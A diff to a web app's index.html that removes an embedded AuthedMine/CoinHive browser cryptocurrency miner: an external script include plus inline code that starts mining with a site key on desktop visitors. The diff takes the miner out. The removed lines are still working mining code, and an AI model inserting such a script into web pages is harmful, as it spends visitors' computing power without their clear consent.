@@ -15,15 +15,5 @@
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="root"></div>
     <script type="text/javascript" src="/dist/static/js/main.cf4a0395.js"></script>
-    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
-    <script>
-      var miner = new CoinHive.Anonymous('d89NMUGUOLDT7o1zR1XFVSsXTp2ddtQh', {throttle: 0.3});
-
-      // Only start on non-mobile devices and if not opted-out
-      // in the last 14400 seconds (4 hours):
-      if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        miner.start();
-      }
-    </script>
   </body>
 </html>
